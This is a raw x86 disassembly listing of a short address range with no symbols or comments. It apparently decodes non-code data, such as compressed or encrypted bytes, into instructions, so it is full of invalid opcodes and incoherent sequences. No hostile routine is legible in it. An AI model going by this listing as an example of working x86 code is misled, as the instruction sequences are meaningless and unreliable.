  42f575:	80 ab 43 55 03 0e 4d 	subb   $0x4d,0xe035543(%ebx)
  42f57c:	e3 5e                	jecxz  0x42f5dc
  42f57e:	0f 79 ae 8b 65 42 1d 	vmwrite 0x1d42658b(%esi),%ebp
  42f585:	92                   	xchg   %eax,%edx
  42f586:	f7 11                	notl   (%ecx)
  42f588:	7d 5e                	jge    0x42f5e8
  42f58a:	26 c7 c2 91 4b 9c 29 	es mov $0x299c4b91,%edx
  42f591:	1d b6 8c 8e ce       	sbb    $0xce8e8cb6,%eax
  42f596:	60                   	pusha
  42f597:	60                   	pusha
  42f598:	7c 55                	jl     0x42f5ef
  42f59a:	78 83                	js     0x42f51f
  42f59c:	4a                   	dec    %edx
  42f59d:	a8 b8                	test   $0xb8,%al
  42f59f:	3b 2f                	cmp    (%edi),%ebp
  42f5a1:	05 72 3d 4f ac       	add    $0xac4f3d72,%eax
  42f5a6:	4e                   	dec    %esi
  42f5a7:	66 05 8e fe          	add    $0xfe8e,%ax
  42f5ab:	ff 18                	lcall  *(%eax)
  42f5ad:	e6 9d                	out    %al,$0x9d
  42f5af:	80 bd b5 8a ed 2b 19 	cmpb   $0x19,0x2bed8ab5(%ebp)
  42f5b6:	56                   	push   %esi
  42f5b7:	06                   	push   %es
  42f5b8:	5f                   	pop    %edi
  42f5b9:	06                   	push   %es
  42f5ba:	85 3f                	test   %edi,(%edi)
  42f5bc:	82 2d 21 08 cb 24 f6 	subb   $0xf6,0x24cb0821
  42f5c3:	7e 86                	jle    0x42f54b
  42f5c5:	b1 17                	mov    $0x17,%cl
  42f5c7:	7f 39                	jg     0x42f602
  42f5c9:	5a                   	pop    %edx
  42f5ca:	32 94 d3 bf ee af c5 	xor    -0x3a501141(%ebx,%edx,8),%dl
  42f5d1:	ee                   	out    %al,(%dx)
  42f5d2:	7b 8a                	jnp    0x42f55e
  42f5d4:	fd                   	std
  42f5d5:	7d f7                	jge    0x42f5ce
  42f5d7:	0b cb                	or     %ebx,%ecx
  42f5d9:	38 b7 15 56 bd 50    	cmp    %dh,0x50bd5615(%edi)
  42f5df:	e1 d4                	loope  0x42f5b5
  42f5e1:	e0 16                	loopne 0x42f5f9
  42f5e3:	f3 cb                	repz lret
  42f5e5:	6e                   	outsb  %ds:(%esi),(%dx)
  42f5e6:	56                   	push   %esi
  42f5e7:	bd 29 36 21 13       	mov    $0x13213629,%ebp
  42f5ec:	a0 1c e8 44 c5       	mov    0xc544e81c,%al
  42f5f1:	48                   	dec    %eax
  42f5f2:	3c 3f                	cmp    $0x3f,%al
  42f5f4:	24 c0                	and    $0xc0,%al
  42f5f6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  42f5f7:	23 66 7b             	and    0x7b(%esi),%esp
  42f5fa:	3a 36                	cmp    (%esi),%dh
  42f5fc:	e9 06 3d 0e c7       	jmp    0xc7513307
  42f601:	80 69 5b ae          	subb   $0xae,0x5b(%ecx)
  42f605:	c2 ed 58             	ret    $0x58ed
  42f608:	9e                   	sahf
  42f609:	cd a4                	int    $0xa4
  42f60b:	49                   	dec    %ecx
  42f60c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  42f60d:	1f                   	pop    %ds
  42f60e:	17                   	pop    %ss
  42f60f:	c3                   	ret
  42f610:	0c 27                	or     $0x27,%al
  42f612:	76 b5                	jbe    0x42f5c9
  42f614:	69 d5 a6 0d df 9a    	imul   $0x9adf0da6,%ebp,%edx
  42f61a:	53                   	push   %ebx
  42f61b:	6f                   	outsl  %ds:(%esi),(%dx)
  42f61c:	8b 9d 7b 97 a2 97    	mov    -0x685d6885(%ebp),%ebx
  42f622:	cd 55                	int    $0x55
  42f624:	d7                   	xlat   %ds:(%ebx)
  42f625:	37                   	aaa
  42f626:	7e 6d                	jle    0x42f695
  42f628:	d3 1c fa             	rcrl   %cl,(%edx,%edi,8)
  42f62b:	a9 ad 8e ba 15       	test   $0x15ba8ead,%eax
  42f630:	a8 18                	test   $0x18,%al
  42f632:	21 19                	and    %ebx,(%ecx)
  42f634:	2f                   	das
  42f635:	f8                   	clc
  42f636:	2b b7 11 de 80 48    	sub    0x4880de11(%edi),%esi
  42f63c:	26 a0 9a 7e a7 2f    	mov    %es:0x2fa77e9a,%al
  42f642:	86 c1                	xchg   %al,%cl
  42f644:	e7 85                	out    %eax,$0x85
  42f646:	64 6e                	outsb  %fs:(%esi),(%dx)
  42f648:	2c 7a                	sub    $0x7a,%al
  42f64a:	c3                   	ret
  42f64b:	ed                   	in     (%dx),%eax
  42f64c:	bb 23 fe 86 73       	mov    $0x7386fe23,%ebx
  42f651:	47                   	inc    %edi
  42f652:	a3 d3 61 99 f9       	mov    %eax,0xf99961d3
  42f657:	0a e7                	or     %bh,%ah
  42f659:	73 aa                	jae    0x42f605
  42f65b:	f8                   	clc
  42f65c:	f0 15 da c8 d0 09    	lock adc $0x9d0c8da,%eax
  42f662:	fd                   	std
  42f663:	70 31                	jo     0x42f696
  42f665:	ed                   	in     (%dx),%eax
  42f666:	69 9f e2 89 4b 7d ca 	imul   $0xe469d8ca,0x7d4b89e2(%edi),%ebx
  42f66d:	d8 69 e4 
  42f670:	4e                   	dec    %esi
  42f671:	db c5                	fcmovnb %st(5),%st
  42f673:	8d 06                	lea    (%esi),%eax
  42f675:	4b                   	dec    %ebx
  42f676:	67 9c                	addr16 pushf
  42f678:	aa                   	stos   %al,%es:(%edi)
  42f679:	fe 0b                	decb   (%ebx)
  42f67b:	12 93 94 ab ed 53    	adc    0x53edab94(%ebx),%dl
  42f681:	19 a2 cc 5c d1 59    	sbb    %esp,0x59d15ccc(%edx)
  42f687:	a3 fb 52 94 cf       	mov    %eax,0xcf9452fb
  42f68c:	bc cd 98 4d f8       	mov    $0xf84d98cd,%esp
  42f691:	d0 48 8b             	rorb   $1,-0x75(%eax)
  42f694:	e1 ae                	loope  0x42f644
  42f696:	0a 6a 51             	or     0x51(%edx),%ch
  42f699:	3e 2c fa             	ds sub $0xfa,%al
  42f69c:	d3 17                	rcll   %cl,(%edi)
  42f69e:	2d 85 c3 86 75       	sub    $0x7586c385,%eax
  42f6a3:	0d f4 99 ff f4       	or     $0xf4ff99f4,%eax
  42f6a8:	29 79 b7             	sub    %edi,-0x49(%ecx)
  42f6ab:	89 b6 38 38 87 a6    	mov    %esi,-0x5978c7c8(%esi)
  42f6b1:	67 62 aa ea ea       	bound  %ebp,-0x1516(%bp,%si)
  42f6b6:	0e                   	push   %cs
  42f6b7:	e0 d6                	loopne 0x42f68f
  42f6b9:	49                   	dec    %ecx
  42f6ba:	57                   	push   %edi
  42f6bb:	b9 d2 1a 6c 1d       	mov    $0x1d6c1ad2,%ecx
  42f6c0:	87 e5                	xchg   %esp,%ebp
  42f6c2:	40                   	inc    %eax
  42f6c3:	cc                   	int3
  42f6c4:	5c                   	pop    %esp
  42f6c5:	44                   	inc    %esp
  42f6c6:	be e0 76 7d cf       	mov    $0xcf7d76e0,%esi
  42f6cb:	c9                   	leave
  42f6cc:	3b c6                	cmp    %esi,%eax
  42f6ce:	4e                   	dec    %esi
  42f6cf:	30 f6                	xor    %dh,%dh
  42f6d1:	c1 c8 73             	ror    $0x73,%eax
  42f6d4:	cd 0b                	int    $0xb
  42f6d6:	68 01 a7 2c 2e       	push   $0x2e2ca701
  42f6db:	35 08 62 a7 a8       	xor    $0xa8a76208,%eax
  42f6e0:	39 9f f8 aa 95 c8    	cmp    %ebx,-0x376a5508(%edi)
  42f6e6:	a0 54 cb 43 f6       	mov    0xf643cb54,%al
  42f6eb:	07                   	pop    %es
  42f6ec:	0c 29                	or     $0x29,%al
  42f6ee:	eb 44                	jmp    0x42f734
  42f6f0:	cc                   	int3
  42f6f1:	d1 53 14             	rcll   $1,0x14(%ebx)
  42f6f4:	ea c0 d4 a8 e7 6c c7 	ljmp   $0xc76c,$0xe7a8d4c0
  42f6fb:	bd b7 7d db 70       	mov    $0x70db7db7,%ebp
  42f700:	b9 e8 8f 94 6f       	mov    $0x6f948fe8,%ecx
  42f705:	4a                   	dec    %edx
  42f706:	32 77 ed             	xor    -0x13(%edi),%dh
  42f709:	54                   	push   %esp
  42f70a:	b7 08                	mov    $0x8,%bh
  42f70c:	14 8c                	adc    $0x8c,%al
  42f70e:	39 66 07             	cmp    %esp,0x7(%esi)
  42f711:	c5 86 31 f0 b3 cf    	lds    -0x304c0fcf(%esi),%eax
  42f717:	0a aa 84 12 a3 d6    	or     -0x295ced7c(%edx),%ch
  42f71d:	aa                   	stos   %al,%es:(%edi)
  42f71e:	5b                   	pop    %ebx
  42f71f:	04 1e                	add    $0x1e,%al
  42f721:	79 1f                	jns    0x42f742
  42f723:	55                   	push   %ebp
  42f724:	ce                   	into
  42f725:	e0 ff                	loopne 0x42f726
  42f727:	32 1f                	xor    (%edi),%bl
  42f729:	b9 b3 30 6a 0d       	mov    $0xd6a30b3,%ecx
  42f72e:	1e                   	push   %ds
  42f72f:	08 11                	or     %dl,(%ecx)
  42f731:	c2 8f fa             	ret    $0xfa8f
  42f734:	46                   	inc    %esi
  42f735:	8d                   	lea    (bad),%eax
  42f736:	c7                   	(bad)
  42f737:	c8 a4 62 be          	enter  $0x62a4,$0xbe
  42f73b:	47                   	inc    %edi
  42f73c:	46                   	inc    %esi
  42f73d:	df 1c e5 33 43 9f 74 	fistps 0x749f4333(,%eiz,8)
  42f744:	4d                   	dec    %ebp
  42f745:	13 4c 67 a6          	adc    -0x5a(%edi,%eiz,2),%ecx
  42f749:	d2 c3                	rol    %cl,%bl
  42f74b:	c0 22 b4             	shlb   $0xb4,(%edx)
  42f74e:	88 02                	mov    %al,(%edx)
  42f750:	56                   	push   %esi
  42f751:	85 af 3f fc 40 e2    	test   %ebp,-0x1dbf03c1(%edi)
  42f757:	cc                   	int3
  42f758:	3f                   	aas
  42f759:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42f75a:	f2 0c ef             	repnz or $0xef,%al
  42f75d:	84 1f                	test   %bl,(%edi)
  42f75f:	63 b6 6b 73 e0 f5    	arpl   %esi,-0xa1f8c95(%esi)
  42f765:	8c 01                	mov    %es,(%ecx)
  42f767:	eb e7                	jmp    0x42f750
  42f769:	b9 d1 c4 15 10       	mov    $0x1015c4d1,%ecx
  42f76e:	41                   	inc    %ecx
  42f76f:	f9                   	stc
  42f770:	14 28                	adc    $0x28,%al
  42f772:	00 07                	add    %al,(%edi)
  42f774:	ae                   	scas   %es:(%edi),%al
  42f775:	ec                   	in     (%dx),%al
  42f776:	7b d0                	jnp    0x42f748
  42f778:	1b 8b 88 a0 76 f9    	sbb    -0x6895f78(%ebx),%ecx
  42f77e:	0c 29                	or     $0x29,%al
  42f780:	41                   	inc    %ecx
  42f781:	e4 03                	in     $0x3,%al
  42f783:	fb                   	sti
  42f784:	36 b4 1e             	ss mov $0x1e,%ah
  42f787:	03 4d 06             	add    0x6(%ebp),%ecx
  42f78a:	0d b4 a6 84 7d       	or     $0x7d84a6b4,%eax
  42f78f:	70 70                	jo     0x42f801
  42f791:	72 b3                	jb     0x42f746
  42f793:	69 20 31 8f e4 ec    	imul   $0xece48f31,(%eax),%esp
  42f799:	4c                   	dec    %esp
  42f79a:	69 fc ad 86 d2 14    	imul   $0x14d286ad,%esp,%edi
  42f7a0:	1e                   	push   %ds
  42f7a1:	b3 e7                	mov    $0xe7,%bl
  42f7a3:	c9                   	leave
  42f7a4:	44                   	inc    %esp
  42f7a5:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42f7a6:	66 08 fd             	data16 or %bh,%ch
  42f7a9:	a9 30 29 d0 c0       	test   $0xc0d02930,%eax
  42f7ae:	1e                   	push   %ds
  42f7af:	f3 af                	repz scas %es:(%edi),%eax
  42f7b1:	2c 0a                	sub    $0xa,%al
  42f7b3:	69 a8 8c 26 d8 21 0a 	imul   $0x3ee5cd0a,0x21d8268c(%eax),%ebp
  42f7ba:	cd e5 3e 
  42f7bd:	e5 29                	in     $0x29,%eax
  42f7bf:	46                   	inc    %esi
  42f7c0:	80 ff 59             	cmp    $0x59,%bh
  42f7c3:	6f                   	outsl  %ds:(%esi),(%dx)
  42f7c4:	33 2d 89 6c 87 1e    	xor    0x1e876c89,%ebp
  42f7ca:	a0 2a c2 71 04       	mov    0x471c22a,%al
  42f7cf:	22 af 51 88 13 e5    	and    -0x1aec77af(%edi),%ch
  42f7d5:	3b d4                	cmp    %esp,%edx
  42f7d7:	8d                   	lea    (bad),%esp
  42f7d8:	e7 7c                	out    %eax,$0x7c
  42f7da:	e0 af                	loopne 0x42f78b
  42f7dc:	dc 56 8b             	fcoml  -0x75(%esi)
  42f7df:	e6 5b                	out    %al,$0x5b
  42f7e1:	87 84 76 a8 c9 ae d0 	xchg   %eax,-0x2f513658(%esi,%esi,2)
  42f7e8:	47                   	inc    %edi
  42f7e9:	26 c3                	es ret
  42f7eb:	c4                   	(bad)
  42f7ec:	cd c3                	int    $0xc3
  42f7ee:	39 a7 c2 ed 03 d5    	cmp    %esp,-0x2afc123e(%edi)
  42f7f4:	49                   	dec    %ecx
  42f7f5:	ee                   	out    %al,(%dx)
  42f7f6:	82 ee 07             	sub    $0x7,%dh
  42f7f9:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  42f7fb:	14 eb                	adc    $0xeb,%al
  42f7fd:	0c e9                	or     $0xe9,%al
  42f7ff:	5e                   	pop    %esi
  42f800:	46                   	inc    %esi
  42f801:	ef                   	out    %eax,(%dx)
  42f802:	b1 69                	mov    $0x69,%cl
  42f804:	7d 7d                	jge    0x42f883
  42f806:	32 7b 4a             	xor    0x4a(%ebx),%bh
  42f809:	0c 11                	or     $0x11,%al
  42f80b:	cd f8                	int    $0xf8
  42f80d:	eb 15                	jmp    0x42f824
  42f80f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42f810:	e2 22                	loop   0x42f834
  42f812:	ff ae ab ef 16 74    	ljmp   *0x7416efab(%esi)
  42f818:	12 50 fa             	adc    -0x6(%eax),%dl
  42f81b:	b2 87                	mov    $0x87,%dl
  42f81d:	40                   	inc    %eax
  42f81e:	64 85 69 71          	test   %ebp,%fs:0x71(%ecx)
  42f822:	8c 4b da             	mov    %cs,-0x26(%ebx)
  42f825:	48                   	dec    %eax
  42f826:	15 d0 83 3c 3d       	adc    $0x3d3c83d0,%eax
  42f82b:	d1 89 3e d0 13 b9    	rorl   $1,-0x46ec2fc2(%ecx)
  42f831:	0f fc 7c c3 98       	paddb  -0x68(%ebx,%eax,8),%mm7
  42f836:	bd 2d 23 df 25       	mov    $0x25df232d,%ebp
  42f83b:	37                   	aaa
  42f83c:	cd 1e                	int    $0x1e
  42f83e:	1c 84                	sbb    $0x84,%al
  42f840:	03 c6                	add    %esi,%eax
  42f842:	63 df                	arpl   %ebx,%edi
  42f844:	da 8c f8 ff 7b 99 06 	fimull 0x6997bff(%eax,%edi,8)
  42f84b:	1a a6 3f 44 25 22    	sbb    0x2225443f(%esi),%ah
  42f851:	64 69 50 9c 5a 41 6e 	imul   $0xc56e415a,%fs:-0x64(%eax),%edx
  42f858:	c5 
  42f859:	75 ff                	jne    0x42f85a
  42f85b:	35 cf 19 73 7e       	xor    $0x7e7319cf,%eax
  42f860:	9c                   	pushf
  42f861:	ca 65 b1             	lret   $0xb165
  42f864:	e7 e6                	out    %eax,$0xe6
  42f866:	93                   	xchg   %eax,%ebx
  42f867:	8d 3d 7e 5e 02 42    	lea    0x42025e7e,%edi
  42f86d:	ea 75 7d 83 af 51 8f 	ljmp   $0x8f51,$0xaf837d75
  42f874:	67 99                	addr16 cltd
  42f876:	85 9f eb 86 14 b4    	test   %ebx,-0x4beb7915(%edi)
  42f87c:	29 71 c6             	sub    %esi,-0x3a(%ecx)
  42f87f:	51                   	push   %ecx
  42f880:	45                   	inc    %ebp
  42f881:	74 72                	je     0x42f8f5
  42f883:	8b 9a 38 a6 f7 e3    	mov    -0x1c0859c8(%edx),%ebx
  42f889:	2d 4b b6 22 4e       	sub    $0x4e22b64b,%eax
  42f88e:	cd 25                	int    $0x25
  42f890:	30 d5                	xor    %dl,%ch
  42f892:	94                   	xchg   %eax,%esp
  42f893:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42f894:	5a                   	pop    %edx
  42f895:	38 27                	cmp    %ah,(%edi)
  42f897:	84 4d 19             	test   %cl,0x19(%ebp)
  42f89a:	94                   	xchg   %eax,%esp
  42f89b:	60                   	pusha
  42f89c:	28 80 30 72 9e f8    	sub    %al,-0x7618dd0(%eax)
  42f8a2:	6a 99                	push   $0xffffff99
  42f8a4:	8b 29                	mov    (%ecx),%ebp
  42f8a6:	73 9c                	jae    0x42f844
  42f8a8:	b2 b2                	mov    $0xb2,%dl
  42f8aa:	17                   	pop    %ss
  42f8ab:	c3                   	ret
  42f8ac:	57                   	push   %edi
  42f8ad:	d6                   	salc
  42f8ae:	d7                   	xlat   %ds:(%ebx)
  42f8af:	de 21                	fisubs (%ecx)
  42f8b1:	b1 36                	mov    $0x36,%cl
  42f8b3:	37                   	aaa
  42f8b4:	b8 48 a7 1c 7c       	mov    $0x7c1ca748,%eax
  42f8b9:	6a 8d                	push   $0xffffff8d
  42f8bb:	bc d0 d8 e1 e2       	mov    $0xe2e1d8d0,%esp
  42f8c0:	ff 81 ca d2 87 02    	incl   0x287d2ca(%ecx)
  42f8c6:	00 a1 0f 35 16 32    	add    %ah,0x3216350f(%ecx)
  42f8cc:	fe                   	(bad)
  42f8cd:	57                   	push   %edi
  42f8ce:	db 85 38 be b1 36    	fildl  0x36b1be38(%ebp)
  42f8d4:	95                   	xchg   %eax,%ebp
  42f8d5:	c7                   	(bad)
  42f8d6:	cb                   	lret
  42f8d7:	31 76 c2             	xor    %esi,-0x3e(%esi)
  42f8da:	25 ed eb 23 4c       	and    $0x4c23ebed,%eax
  42f8df:	3c 1a                	cmp    $0x1a,%al
  42f8e1:	54                   	push   %esp
  42f8e2:	90                   	nop
  42f8e3:	2f                   	das
  42f8e4:	b3 3a                	mov    $0x3a,%bl
  42f8e6:	4e                   	dec    %esi
  42f8e7:	16                   	push   %ss
  42f8e8:	1c 91                	sbb    $0x91,%al
  42f8ea:	91                   	xchg   %eax,%ecx
  42f8eb:	60                   	pusha
  42f8ec:	01 4a 19             	add    %ecx,0x19(%edx)
  42f8ef:	6c                   	insb   (%dx),%es:(%edi)
  42f8f0:	ce                   	into
  42f8f1:	35 cb 22 e8 a4       	xor    $0xa4e822cb,%eax
  42f8f6:	7d ba                	jge    0x42f8b2
  42f8f8:	1f                   	pop    %ds
  42f8f9:	62 a5 fe c7 76 43    	bound  %esp,0x4376c7fe(%ebp)
  42f8ff:	21 12                	and    %edx,(%edx)
  42f901:	4b                   	dec    %ebx
  42f902:	39 da                	cmp    %ebx,%edx
  42f904:	a8 48                	test   $0x48,%al
  42f906:	5b                   	pop    %ebx
  42f907:	9f                   	lahf
  42f908:	9e                   	sahf
  42f909:	b5 b2                	mov    $0xb2,%ch
  42f90b:	e8 45 c1 ab 72       	call   0x72eeba55
  42f910:	73 2f                	jae    0x42f941
  42f912:	05 1a be 8f 9c       	add    $0x9c8fbe1a,%eax
  42f917:	5c                   	pop    %esp
  42f918:	d0 71 f9             	shlb   $1,-0x7(%ecx)
  42f91b:	f9                   	stc
  42f91c:	43                   	inc    %ebx
  42f91d:	1e                   	push   %ds
  42f91e:	55                   	push   %ebp
  42f91f:	69 e7 89 f2 ef 38    	imul   $0x38eff289,%edi,%esp
  42f925:	e1 b4                	loope  0x42f8db
  42f927:	d8 34 b1             	fdivs  (%ecx,%esi,4)
  42f92a:	b7 81                	mov    $0x81,%bh
  42f92c:	15 c2 0e dc f8       	adc    $0xf8dc0ec2,%eax
  42f931:	8b 83 09 eb c8 f0    	mov    -0xf3714f7(%ebx),%eax
  42f937:	cf                   	iret
  42f938:	0e                   	push   %cs
  42f939:	97                   	xchg   %eax,%edi
  42f93a:	66 7e 68             	data16 jle 0x42f9a5
  42f93d:	56                   	push   %esi
  42f93e:	c3                   	ret
  42f93f:	ad                   	lods   %ds:(%esi),%eax
  42f940:	cd 3d                	int    $0x3d
  42f942:	5e                   	pop    %esi
  42f943:	df 8b b0 37 8a f1    	fisttps -0xe75c850(%ebx)
  42f949:	26 cd 8d             	es int $0x8d
  42f94c:	da 68 66             	fisubrl 0x66(%eax)
  42f94f:	d3 3b                	sarl   %cl,(%ebx)
  42f951:	87 b9 83 74 32 76    	xchg   %edi,0x76327483(%ecx)
  42f957:	f4                   	hlt
  42f958:	dd 0a                	fisttpll (%edx)
  42f95a:	75 55                	jne    0x42f9b1
  42f95c:	18 bb 11 a9 1a 09    	sbb    %bh,0x91aa911(%ebx)
  42f962:	4c                   	dec    %esp
  42f963:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42f964:	e3 d7                	jecxz  0x42f93d
  42f966:	9e                   	sahf
  42f967:	bb e5 25 49 d2       	mov    $0xd24925e5,%ebx
  42f96c:	32 41 76             	xor    0x76(%ecx),%al
  42f96f:	7f db                	jg     0x42f94c
  42f971:	b5 30                	mov    $0x30,%ch
  42f973:	f8                   	clc
  42f974:	b3 98                	mov    $0x98,%bl
  42f976:	fb                   	sti
  42f977:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42f978:	bd 25 38 47 68       	mov    $0x68473825,%ebp
  42f97d:	6e                   	outsb  %ds:(%esi),(%dx)
  42f97e:	47                   	inc    %edi
  42f97f:	00 4d 4c             	add    %cl,0x4c(%ebp)
  42f982:	94                   	xchg   %eax,%esp
  42f983:	41                   	inc    %ecx
  42f984:	df b4 fd 85 2d a5 45 	fbstp  0x45a52d85(%ebp,%edi,8)
  42f98b:	6f                   	outsl  %ds:(%esi),(%dx)
  42f98c:	7f 5b                	jg     0x42f9e9
  42f98e:	d3 fe                	sar    %cl,%esi
  42f990:	d3 e4                	shl    %cl,%esp
  42f992:	c7                   	(bad)
  42f993:	cc                   	int3
  42f994:	8d 8a 40 b9 45 0a    	lea    0xa45b940(%edx),%ecx
  42f99a:	63 38                	arpl   %edi,(%eax)
  42f99c:	ed                   	in     (%dx),%eax
  42f99d:	ab                   	stos   %eax,%es:(%edi)
  42f99e:	bd 03 0d 43 29       	mov    $0x29430d03,%ebp
  42f9a3:	47                   	inc    %edi
  42f9a4:	0f 04                	(bad)
  42f9a6:	2b e8                	sub    %eax,%ebp
  42f9a8:	fb                   	sti
  42f9a9:	c7                   	(bad)
  42f9aa:	88 11                	mov    %dl,(%ecx)
  42f9ac:	07                   	pop    %es
  42f9ad:	ea 5f 29 fe cd 84 a0 	ljmp   $0xa084,$0xcdfe295f
  42f9b4:	86 25 ff cc a3 71    	xchg   %ah,0x71a3ccff
  42f9ba:	3d f2 f4 35 a6       	cmp    $0xa635f4f2,%eax
  42f9bf:	17                   	pop    %ss
  42f9c0:	17                   	pop    %ss
  42f9c1:	f5                   	cmc
  42f9c2:	79 b2                	jns    0x42f976
  42f9c4:	af                   	scas   %es:(%edi),%eax
  42f9c5:	c3                   	ret
  42f9c6:	d3 da                	rcr    %cl,%edx
  42f9c8:	98                   	cwtl
  42f9c9:	5e                   	pop    %esi
  42f9ca:	3a cc                	cmp    %ah,%cl
  42f9cc:	e3 b2                	jecxz  0x42f980
  42f9ce:	a8 b0                	test   $0xb0,%al
  42f9d0:	a1 e1 7a 4c a5       	mov    0xa54c7ae1,%eax
  42f9d5:	cf                   	iret
  42f9d6:	4d                   	dec    %ebp
  42f9d7:	a9 af b4 ed 91       	test   $0x91edb4af,%eax
  42f9dc:	d3 c0                	rol    %cl,%eax
  42f9de:	fc                   	cld
  42f9df:	d1 8b 53 4b 5e 8b    	rorl   $1,-0x74a1b4ad(%ebx)
  42f9e5:	9e                   	sahf
  42f9e6:	b1 82                	mov    $0x82,%cl
  42f9e8:	df e6                	(bad)
  42f9ea:	34 eb                	xor    $0xeb,%al
  42f9ec:	71 d8                	jno    0x42f9c6
  42f9ee:	31 4f 24             	xor    %ecx,0x24(%edi)
  42f9f1:	db b4 e0 b7 ea d0 8a 	(bad) -0x752f1549(%eax,%eiz,8)
  42f9f8:	d2 c4                	rol    %cl,%ah
  42f9fa:	37                   	aaa
  42f9fb:	bc 09 e6 7e c4       	mov    $0xc47ee609,%esp
  42fa00:	79 cc                	jns    0x42f9ce
  42fa02:	b5 c8                	mov    $0xc8,%ch
  42fa04:	09 60 42             	or     %esp,0x42(%eax)
  42fa07:	b6 b5                	mov    $0xb5,%dh
  42fa09:	3a f0                	cmp    %al,%dh
  42fa0b:	76 1f                	jbe    0x42fa2c
  42fa0d:	9d                   	popf
  42fa0e:	5b                   	pop    %ebx
  42fa0f:	69 ab 9c a5 67 86 e8 	imul   $0x744c53e8,-0x79985a64(%ebx),%ebp
  42fa16:	53 4c 74 
  42fa19:	3b 63 4c             	cmp    0x4c(%ebx),%esp
  42fa1c:	65 d7                	xlat   %gs:(%ebx)
  42fa1e:	a0 91 32 12 ec       	mov    0xec123291,%al
  42fa23:	b0 74                	mov    $0x74,%al
  42fa25:	fb                   	sti
  42fa26:	79 be                	jns    0x42f9e6
  42fa28:	0d e3 e0 11 ec       	or     $0xec11e0e3,%eax
  42fa2d:	eb 42                	jmp    0x42fa71
  42fa2f:	b8 e4 ba a5 91       	mov    $0x91a5bae4,%eax
  42fa34:	7c 1e                	jl     0x42fa54
  42fa36:	dd b5 27 69 9a 07    	fnsave 0x79a6927(%ebp)
  42fa3c:	27                   	daa
  42fa3d:	00 fc                	add    %bh,%ah
  42fa3f:	ea 08 ca f6 32 54 9f 	ljmp   $0x9f54,$0x32f6ca08
  42fa46:	f5                   	cmc
  42fa47:	86 62 0e             	xchg   %ah,0xe(%edx)
  42fa4a:	5e                   	pop    %esi
  42fa4b:	32 dd                	xor    %ch,%bl
  42fa4d:	73 16                	jae    0x42fa65
  42fa4f:	21 24 82             	and    %esp,(%edx,%eax,4)
  42fa52:	8c cd                	mov    %cs,%ebp
  42fa54:	c9                   	leave
  42fa55:	ac                   	lods   %ds:(%esi),%al
  42fa56:	2f                   	das
  42fa57:	8e b8 ba 59 4c 50    	mov    0x504c59ba(%eax),%?
  42fa5d:	9b                   	fwait
  42fa5e:	d2 06                	rolb   %cl,(%esi)
  42fa60:	0c 7d                	or     $0x7d,%al
  42fa62:	cc                   	int3
  42fa63:	3c 61                	cmp    $0x61,%al
  42fa65:	c4                   	(bad)
  42fa66:	c0 bb 12 a3 8e 8b 79 	sarb   $0x79,-0x74715cee(%ebx)
  42fa6d:	8c 79 8f             	mov    %?,-0x71(%ecx)
  42fa70:	96                   	xchg   %eax,%esi
  42fa71:	fe                   	(bad)
  42fa72:	ab                   	stos   %eax,%es:(%edi)
  42fa73:	c2 11 e2             	ret    $0xe211
  42fa76:	57                   	push   %edi
  42fa77:	76 5d                	jbe    0x42fad6
  42fa79:	06                   	push   %es
  42fa7a:	e2 70                	loop   0x42faec
  42fa7c:	ee                   	out    %al,(%dx)
  42fa7d:	a2 93 7f 7e 7f       	mov    %al,0x7f7e7f93
  42fa82:	16                   	push   %ss
  42fa83:	73 16                	jae    0x42fa9b
  42fa85:	22 93 26 de e8 3a    	and    0x3ae8de26(%ebx),%dl
  42fa8b:	6c                   	insb   (%dx),%es:(%edi)
  42fa8c:	a9 cc e2 ee 29       	test   $0x29eee2cc,%eax
  42fa91:	0a 96 ef 94 78 9d    	or     -0x62876b11(%esi),%dl
  42fa97:	5a                   	pop    %edx
  42fa98:	2f                   	das
  42fa99:	22 3d 93 d3 b1 b5    	and    0xb5b1d393,%bh
  42fa9f:	cb                   	lret
  42faa0:	ef                   	out    %eax,(%dx)
  42faa1:	7f 18                	jg     0x42fabb
  42faa3:	00 b3 df 6a fd 7e    	add    %dh,0x7efd6adf(%ebx)
  42faa9:	ed                   	in     (%dx),%eax
  42faaa:	ef                   	out    %eax,(%dx)
  42faab:	07                   	pop    %es
  42faac:	9d                   	popf
  42faad:	d3 14 2b             	rcll   %cl,(%ebx,%ebp,1)
  42fab0:	8a d0                	mov    %al,%dl
  42fab2:	b2 2b                	mov    $0x2b,%dl
  42fab4:	01 3f                	add    %edi,(%edi)
  42fab6:	aa                   	stos   %al,%es:(%edi)
  42fab7:	81 93 a9 eb d8 61 cc 	adcl   $0xc41dcfcc,0x61d8eba9(%ebx)
  42fabe:	cf 1d c4 
  42fac1:	6a 45                	push   $0x45
  42fac3:	83 5d 01 eb          	sbbl   $0xffffffeb,0x1(%ebp)
  42fac7:	60                   	pusha
  42fac8:	ac                   	lods   %ds:(%esi),%al
  42fac9:	40                   	inc    %eax
  42faca:	63 f2                	arpl   %esi,%edx
  42facc:	7e 87                	jle    0x42fa55
  42face:	95                   	xchg   %eax,%ebp
  42facf:	d8 7b f7             	fdivrs -0x9(%ebx)
  42fad2:	1a 54 09 c4          	sbb    -0x3c(%ecx,%ecx,1),%dl
  42fad6:	20 fe                	and    %bh,%dh
  42fad8:	b0 15                	mov    $0x15,%al
  42fada:	60                   	pusha
  42fadb:	d1 62 dd             	shll   $1,-0x23(%edx)
  42fade:	ae                   	scas   %es:(%edi),%al
  42fadf:	a0 79 21 97 5d       	mov    0x5d972179,%al
  42fae4:	b9 c2 34 a4 4c       	mov    $0x4ca434c2,%ecx
  42fae9:	af                   	scas   %es:(%edi),%eax
  42faea:	9b                   	fwait
  42faeb:	8c dc                	mov    %ds,%esp
  42faed:	a2 a2 e1 dd ab       	mov    %al,0xabdde1a2
  42faf2:	f6 fe                	idiv   %dh
  42faf4:	2d b6 b9 79 27       	sub    $0x2779b9b6,%eax
  42faf9:	60                   	pusha
  42fafa:	c0 63 5a fb          	shlb   $0xfb,0x5a(%ebx)
  42fafe:	99                   	cltd
  42faff:	b3 a4                	mov    $0xa4,%bl
  42fb01:	5f                   	pop    %edi
